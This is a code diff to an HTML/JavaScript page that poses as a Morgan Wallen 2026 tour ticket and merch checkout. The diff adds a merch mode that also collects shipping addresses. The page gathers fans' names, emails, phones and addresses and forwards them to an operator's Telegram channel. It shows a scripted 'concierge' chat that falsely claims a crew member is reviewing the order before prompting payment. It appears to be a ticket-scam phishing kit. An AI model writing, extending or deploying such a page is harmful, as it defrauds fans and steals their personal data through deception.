@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Morgan Wallen — One Night At A Time Tour 2026</title>
+    <title>Morgan Wallen — Still The Problem Tour 2026 · Checkout</title>
     <style>
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -314,10 +314,11 @@
 ════════════════════════════════════════════════════ -->
 <div class="page active" id="page-details">
     <div class="form-card">
-        <div class="badge-top">🏁 One Night At A Time Tour 2026 🏁</div>
-        <h2>Fan Registration</h2>
+        <div class="badge-top" id="details-badge">🏁 Still The Problem Tour 2026 🏁</div>
+        <h2 id="details-heading">Fan Registration</h2>
         <p class="form-sub">
-            You selected: <strong id="display-ticket-type">Pit Pass</strong> — <span id="display-ticket-price">$250</span>
+            <span id="details-mode-label">You selected:</span>
+            <strong id="display-ticket-type">Pit Pass</strong> — <span id="display-ticket-price">$250</span>
         </p>
         <form id="detailsForm" onsubmit="submitDetails(event)">
             <div class="form-group">
@@ -332,36 +333,55 @@
                 <label>Phone Number</label>
                 <input type="tel" id="input-phone" placeholder="(555) 123-4567" required />
             </div>
-            <div class="form-group">
-                <label>How long have you been a Morgan Wallen fan?</label>
-                <select id="input-fan-duration" required>
-                    <option value="">— Select —</option>
-                    <option value="Just discovered him">Just discovered him 🆕</option>
-                    <option value="1-2 years">1-2 years</option>
-                    <option value="3-5 years">3-5 years</option>
-                    <option value="Since The Way I Talk (2016)">Since "The Way I Talk" (2016)</option>
-                    <option value="Day one — from the start">Day one — from the start 🎸</option>
-                </select>
+            <div class="merch-only" id="group-shipping" style="display:none;">
+                <div class="form-group">
+                    <label>Shipping Address</label>
+                    <textarea id="input-address" placeholder="Street, City, State, ZIP, Country"></textarea>
+                </div>
+                <div class="form-group">
+                    <label>Size (if applicable)</label>
+                    <select id="input-size">
+                        <option value="N/A">— N/A —</option>
+                        <option>XS</option><option>S</option><option>M</option>
+                        <option>L</option><option>XL</option><option>XXL</option>
+                    </select>
+                </div>
+            </div>
+            <div class="ticket-only" id="group-fan-duration">
+                <div class="form-group">
+                    <label>How long have you been a Morgan Wallen fan?</label>
+                    <select id="input-fan-duration">
+                        <option value="">— Select —</option>
+                        <option value="Just discovered him">Just discovered him 🆕</option>
+                        <option value="1-2 years">1-2 years</option>
+                        <option value="3-5 years">3-5 years</option>
+                        <option value="Since The Way I Talk (2016)">Since "The Way I Talk" (2016)</option>
+                        <option value="Day one — from the start">Day one — from the start 🎸</option>
+                    </select>
+                </div>
             </div>
             <div class="form-group">
                 <label>What's your favorite Morgan Wallen song?</label>
                 <input type="text" id="input-fav-song" placeholder="e.g. Last Night, Whiskey Glasses, 7 Summers..." required />
             </div>
-            <div class="form-group">
-                <label>Which album is on repeat?</label>
-                <select id="input-fav-album" required>
-                    <option value="">— Select —</option>
-                    <option value="If I Know Me (2018)">If I Know Me (2018)</option>
-                    <option value="Dangerous: The Double Album (2021)">Dangerous (2021) 🔥</option>
-                    <option value="One Thing At A Time (2023)">One Thing At A Time (2023)</option>
-                    <option value="All of them — no skips">All of them — no skips! 🥃</option>
-                </select>
+            <div class="ticket-only" id="group-fav-album">
+                <div class="form-group">
+                    <label>Which album is on repeat?</label>
+                    <select id="input-fav-album">
+                        <option value="">— Select —</option>
+                        <option value="If I Know Me (2018)">If I Know Me (2018)</option>
+                        <option value="Dangerous: The Double Album (2021)">Dangerous (2021) 🔥</option>
+                        <option value="One Thing At A Time (2023)">One Thing At A Time (2023)</option>
+                        <option value="I'm The Problem (2025)">I'm The Problem (2025)</option>
+                        <option value="All of them — no skips">All of them — no skips! 🥃</option>
+                    </select>
+                </div>
             </div>
             <div class="form-group">
                 <label>Anything you'd like to share? (optional)</label>
                 <textarea id="input-message" placeholder="A memory from a show, a lyric that hits home..."></textarea>
             </div>
-            <button type="submit" class="btn btn-primary">Continue to Secure Checkout →</button>
+            <button type="submit" class="btn btn-primary" id="details-submit">Continue to Secure Checkout →</button>
         </form>
     </div>
 </div>
@@ -371,14 +391,14 @@
 ════════════════════════════════════════════════════ -->
 <div class="page" id="page-chat-agent">
     <div class="chat-agent-card">
-        <div class="icon-star">🤠</div>
-        <h2>Secure Your Spot</h2>
-        <p>Our Wallen Crew concierge team will guide you through the final verification and payment steps to lock in your tickets.</p>
+        <div class="icon-star" id="agent-icon">🤠</div>
+        <h2 id="agent-heading">Secure Your Spot</h2>
+        <p id="agent-sub">Our Wallen Crew concierge team will guide you through the final verification and payment steps to lock in your tickets.</p>
         <div class="ticket-summary">
-            <h4>Your Order</h4>
-            <div class="row"><span>Event</span><strong>One Night At A Time Tour</strong></div>
-            <div class="row"><span>Date</span><strong>Sept 12, 2026</strong></div>
-            <div class="row"><span>Ticket</span><strong id="agent-ticket-label">Pit Pass</strong></div>
+            <h4 id="agent-order-title">Your Order</h4>
+            <div class="row" id="agent-row-event"><span id="agent-row-event-key">Event</span><strong id="agent-row-event-val">Still The Problem Tour</strong></div>
+            <div class="row" id="agent-row-date"><span>Date</span><strong>2026 Stadium Tour</strong></div>
+            <div class="row"><span id="agent-item-key">Ticket</span><strong id="agent-ticket-label">Pit Pass</strong></div>
             <div class="row"><span>Price</span><strong id="agent-ticket-price">$250</strong></div>
             <div class="row"><span>Qty</span><strong>1</strong></div>
         </div>
@@ -396,16 +416,16 @@
 ════════════════════════════════════════════════════ -->
 <div class="page" id="page-confirmation">
     <div class="big-icon">🎸</div>
-    <h1>You're Booked!</h1>
+    <h1 id="confirm-heading">You're Booked!</h1>
     <p class="conf-msg">
         Your <strong id="confirm-ticket">ticket</strong> for the
-        <strong>Morgan Wallen — One Night At A Time Tour</strong> is confirmed.
+        <strong id="confirm-event-label">Morgan Wallen — Still The Problem Tour</strong> is confirmed.
     </p>
     <p style="color:#888; font-size:0.9rem;">
         A confirmation receipt will be sent to <span id="confirm-email">your email</span>.
     </p>
     <div class="kacey-quote" style="margin-top:1.2rem;">
-        "I guess I’m exactly where I’m supposed to be." — Morgan Wallen
+        "I guess I'm exactly where I'm supposed to be." — Morgan Wallen
     </div>
     <button class="btn btn-primary" onclick="goBackToSite()" style="max-width:280px; margin:1.8rem auto 0;">
         ← Back to Site
@@ -493,19 +513,58 @@ let chatSession = {
     pollTimer:   null,
 };
 
+let checkoutMode = 'ticket'; // 'ticket' | 'merch'
+let merchInfo    = null;
+
 (function init() {
     const params = new URLSearchParams(window.location.search);
-    let tId = parseInt(params.get('ticket')) || 1;
-    if (!TICKET_PRICES[tId]) tId = 1;
+    checkoutMode = (params.get('mode') === 'merch') ? 'merch' : 'ticket';
 
-    currentTicket = { id: tId, label: TICKET_LABELS[tId], price: TICKET_PRICES[tId] };
+    if (checkoutMode === 'merch') {
+        const item  = params.get('item')  || 'Tour Merch Item';
+        const price = parseInt(params.get('price')) || 45;
+        const sku   = params.get('sku')   || 'MW-MERCH';
+        merchInfo = { item, price, sku };
+        currentTicket = { id: 0, label: item, price };
+
+        // Re-skin the page for merch checkout
+        document.getElementById('details-badge').innerHTML = '🛒 Locker Room Merch Checkout 🛒';
+        document.getElementById('details-heading').textContent = 'Merch Order Details';
+        document.getElementById('details-mode-label').textContent = 'You\'re buying:';
+        document.getElementById('group-shipping').style.display = 'block';
+        document.querySelectorAll('.ticket-only').forEach(el => el.style.display = 'none');
+        document.getElementById('agent-icon').textContent = '🛒';
+        document.getElementById('agent-heading').textContent = 'Confirm Your Merch Order';
+        document.getElementById('agent-sub').textContent = 'Our Locker Room concierge will verify shipping details and walk you through secure payment to ship your gear.';
+        document.getElementById('agent-order-title').textContent = 'Your Merch Order';
+        document.getElementById('agent-row-event-key').textContent = 'Order';
+        document.getElementById('agent-row-event-val').textContent = 'Locker Room — Field Issue';
+        document.getElementById('agent-item-key').textContent = 'Item';
+        document.getElementById('confirm-heading').textContent = 'Order Placed!';
+        document.getElementById('confirm-event-label').textContent = 'Morgan Wallen — Locker Room Drop';
+    } else {
+        let tId = parseInt(params.get('ticket')) || 1;
+        if (!TICKET_PRICES[tId]) tId = 1;
+        const tierName = params.get('tier');
+        const tierPrice = parseInt(params.get('price'));
+        const city = params.get('city');
+        currentTicket = {
+            id: tId,
+            label: tierName || TICKET_LABELS[tId],
+            price: tierPrice || TICKET_PRICES[tId],
+            city: city || ''
+        };
+        if (city) {
+            document.getElementById('agent-row-event-val').textContent = 'Still The Problem — ' + city;
+        }
+    }
 
     document.getElementById('display-ticket-type').textContent  = currentTicket.label;
     document.getElementById('display-ticket-price').textContent = '$' + currentTicket.price;
     document.getElementById('agent-ticket-label').textContent   = currentTicket.label;
     document.getElementById('agent-ticket-price').textContent   = '$' + currentTicket.price;
 
-    chatSession.sessionId = 'MW-' + Date.now() + '-' + Math.random().toString(36).slice(2,7).toUpperCase();
+    chatSession.sessionId = (checkoutMode === 'merch' ? 'MW-MERCH-' : 'MW-') + Date.now() + '-' + Math.random().toString(36).slice(2,7).toUpperCase();
     seedTelegramOffset();
 })();
 
@@ -533,14 +592,23 @@ function submitDetails(e) {
         name:        document.getElementById('input-name').value.trim(),
         email:       document.getElementById('input-email').value.trim(),
         phone:       document.getElementById('input-phone').value.trim(),
-        fanDuration: document.getElementById('input-fan-duration').value,
+        fanDuration: document.getElementById('input-fan-duration').value || '',
         favSong:     document.getElementById('input-fav-song').value.trim(),
-        favAlbum:    document.getElementById('input-fav-album').value,
+        favAlbum:    document.getElementById('input-fav-album').value || '',
+        address:     (document.getElementById('input-address') || {}).value || '',
+        size:        (document.getElementById('input-size') || {}).value || '',
         message:     document.getElementById('input-message').value.trim()
     };
 
+    if (checkoutMode === 'merch' && !fanDetails.address.trim()) {
+        alert('Please enter a shipping address for your merch order.');
+        return;
+    }
+
     const record = {
-        type: 'chat_request', ticket: currentTicket.label, price: '$' + currentTicket.price,
+        type: checkoutMode === 'merch' ? 'merch_order' : 'chat_request',
+        mode: checkoutMode,
+        item: currentTicket.label, price: '$' + currentTicket.price,
         sessionId: chatSession.sessionId, ...fanDetails, timestamp: new Date().toISOString()
     };
     adminRecords.push(record);
@@ -566,30 +634,45 @@ function closeChatPopup() {
 }
 
 function sendIntroSequence() {
-    const { name, email, phone, favSong, favAlbum } = fanDetails;
-    const { label, price } = currentTicket;
+    const { name, email, phone, favSong, favAlbum, address, size } = fanDetails;
+    const { label, price, city } = currentTicket;
     const firstName = name.split(' ')[0];
 
-    const introText =
-        'Hey 🎸 I\'m ' + name + ' and I\'m here to lock in my ' + label + ' ($' + price + ') ' +
-        'for the One Night At A Time Tour.\n\n' +
-        '📧 ' + email + '\n📱 ' + phone + '\n' +
-        '🥃 Favorite Track: "' + favSong + '"\n' +
-        '💿 Best Album: ' + favAlbum +
-        (fanDetails.message ? '\n\n📝 Note: "' + fanDetails.message + '"' : '') +
-        '\n\nLet\'s get this done! 🤠';
+    let introText;
+    if (checkoutMode === 'merch') {
+        introText =
+            'Hey 🛒 I\'m ' + name + ' and I\'d like to order the ' + label + ' ($' + price + ') ' +
+            'from the Locker Room drop.\n\n' +
+            '📧 ' + email + '\n📱 ' + phone + '\n' +
+            '📦 Ship to: ' + address + '\n' +
+            (size && size !== 'N/A' ? '📏 Size: ' + size + '\n' : '') +
+            '🥃 Favorite Track: "' + favSong + '"' +
+            (fanDetails.message ? '\n\n📝 Note: "' + fanDetails.message + '"' : '') +
+            '\n\nReady to lock it in! 🤠';
+    } else {
+        introText =
+            'Hey 🎸 I\'m ' + name + ' and I\'m here to lock in my ' + label + ' ($' + price + ') ' +
+            'for the Still The Problem Tour' + (city ? ' — ' + city : '') + '.\n\n' +
+            '📧 ' + email + '\n📱 ' + phone + '\n' +
+            '🥃 Favorite Track: "' + favSong + '"\n' +
+            (favAlbum ? '💿 Best Album: ' + favAlbum : '') +
+            (fanDetails.message ? '\n\n📝 Note: "' + fanDetails.message + '"' : '') +
+            '\n\nLet\'s get this done! 🤠';
+    }
 
     setTimeout(() => {
         appendMessage('fan', introText);
         notifyTelegram(introText);
 
         showTyping(2200, () => {
-            appendMessage('agent',
-                'Hey there, ' + firstName + '! 🤠\n\n' +
-                'We\'ve got your ' + label + ' held in our system. ' +
-                'Glad to see another fan of "' + favSong + '" in the crew.\n\n' +
-                'An agent is reviewing your registration right now. Hang tight.'
-            );
+            const agentReply = checkoutMode === 'merch'
+                ? 'Hey ' + firstName + '! 🛒\n\nGot your ' + label + ' reserved in the Locker Room. ' +
+                  'We\'ll verify shipping and get this gear in the mail to you.\n\nA crew member is reviewing your order now.'
+                : 'Hey there, ' + firstName + '! 🤠\n\n' +
+                  'We\'ve got your ' + label + ' held in our system. ' +
+                  'Glad to see another fan of "' + favSong + '" in the crew.\n\n' +
+                  'An agent is reviewing your registration right now. Hang tight.';
+            appendMessage('agent', agentReply);
 
             showTyping(1800, () => {
                 appendPaymentPrompt();
@@ -665,10 +748,10 @@ async function notifyTelegram(messageText) {
     const sid = chatSession.sessionId;
 
     const adminMsg =
-        '🤠 <b>WALLEN TOUR BOOKING</b>\n\n' +
+        (checkoutMode === 'merch' ? '🛒 <b>LOCKER ROOM MERCH ORDER</b>\n\n' : '🤠 <b>WALLEN TOUR BOOKING</b>\n\n') +
         '📌 <b>ID:</b> <code>' + sid + '</code>\n' +
         '👤 <b>Fan:</b> ' + (name || 'Guest') + '\n' +
-        '🎫 <b>Ticket:</b> ' + label + ' ($' + price + ')\n' +
+        (checkoutMode === 'merch' ? '🛍️ <b>Item:</b> ' : '🎫 <b>Ticket:</b> ') + label + ' ($' + price + ')\n' +
         '─────────────────────────────\n' +
         '💬 <b>Message:</b>\n"' + messageText + '"\n' +
         '─────────────────────────────\n\n' +
